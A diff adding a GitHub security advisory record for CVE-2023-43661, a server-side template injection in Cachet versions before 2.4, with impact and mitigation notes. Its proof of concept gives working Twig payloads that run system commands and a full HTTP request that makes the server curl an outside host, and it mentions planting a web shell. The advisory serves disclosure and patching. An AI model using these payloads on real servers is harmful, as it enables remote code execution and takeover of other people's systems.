@@ -1,0 +1,66 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-hv79-p62r-wg3p",
+  "modified": "2023-10-16T14:20:53Z",
+  "published": "2023-10-16T14:20:53Z",
+  "aliases": [
+    "CVE-2023-43661"
+  ],
+  "summary": "Cachet vulnerable to Authenticated Remote Code Execution",
+  "details": "### Summary\n\nA template functionality which allows users to create templates allows them to execute any code on the server during the bad filtration and old twig version.  Within `/cachet/app/Http/Routes/ApiRoutes.php`, and attacker could control `template` input which is passed to `laravel's` dispatched handler `/cachet/app/Bus/Handlers/Commands/Incident/CreateIncidentCommandHandler.php`. If an attacker is able to control this data, they may be able to trigger a server-side template injection vulnerability which can lead to remote code execution.\n\nThis vulnerability does not exist within the [Twig](https://twig.symfony.com/) library itself, but exists during the process of the [Cachet](https://github.com/cachethq/cachet) processing of the data without any filtration. This has been patched in Cachet version  2.4.\n\n### PoC\n\n1. Log in as a default user (non-admin);\n2. Create an incident with name `slug1` and with content: `{{ ['curl yourhost.com','']|sort('system') }}` or with any other content for `Remote code execution` via the `Twig`, for instance: `{{[0]|reduce('system','curl yourhost.com')}}`;\n3. Get an `API` token from your account settings (`X-Cachet-Token`);\n4. Trigger remote code execution using the `api` route: \n\n```\nPOST /api/v1/incidents HTTP/1.1\nHost: myapp\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nCookie: XSRF-TOKEN=eyJpdiI6InZUVVpkRmx1VFlhcytVQkQ1Zk81b1E9PSIsInZhbHVlIjoiSlE0Tmt1cjVoRHFSOHBIR3RoYlAwS0dNZlVHbm02d0tWVW1ERVRvblZTTW1TMHV2MFJUYTNwQWQyZ3pQM1VlMyIsIm1hYyI6IjU4YzAxZjgyYWE4YTU4MTExMDQ3OGRhOTNlYThlZTYxMzI5YzBhMWVhM2RjYzA2ODgzMGVhMGQ5Njg2YTMyMjkifQ%3D%3D; laravel_session=eyJpdiI6IldZcHhMSjBYRmQzUXdGTTRQbGFQTWc9PSIsInZhbHVlIjoiSkRxWncxdWs3Y29ZcXVHMlJ0U2pVVVwvMGdvSUJNK2pEMnhsR2QzVnE1MmMxMWJxUm96K1VnalwvS1pYcXE2cGllIiwibWFjIjoiMDM0MGIxNjRlM2VhOGU5Mzg2OWVkYjZjNmJhY2JlMTE3OTdkMDRkZTQ1NzI5NTMzNzI4YjA5YTcwNzM2M2E5YyJ9\nConnection: close\nX-Cachet-Token: OeiLJ6G6kjsBXeyOo97z\nContent-Length: 109\nContent-type: application/json\n\n{\"template\":\"slug1\", \"name\":\"{{ ['curl pwned.riven.pw','']|sort('system') }}\", \"status\":2, \"visible\":1}\n``` \n\n5. Obtain remote code execution. An attacker could also upload a web-shell using some base64 tricks with pipe to bash. \n\n### Impact\n\nServer-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. Template engines are designed to generate web pages by combining fixed templates with volatile data. Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server. As the name suggests, server-side template injection payloads are delivered and evaluated server-side, potentially making them more dangerous than a typical client-side template injection.\n\n### Mitigation\n\n1. Update `TWIG` to the latest version; \n2. Filter user-controlled data by any safe pattern;\n3. Use `sandboxed` `twig` mode;\n4. Don't allow users (non-admins) to trigger this vulnerability via the `API` endpoint.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "cachethq/cachet"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.4"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/cachethq/cachet/security/advisories/GHSA-hv79-p62r-wg3p"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43661"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/cachethq/cachet/commit/6fb043e109d2a262ce3974e863c54e9e5f5e0587"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/cachethq/cachet"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-74",
+      "CWE-94"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-10-16T14:20:53Z",
+    "nvd_published_at": "2023-10-11T20:15:10Z"
+  }
+}
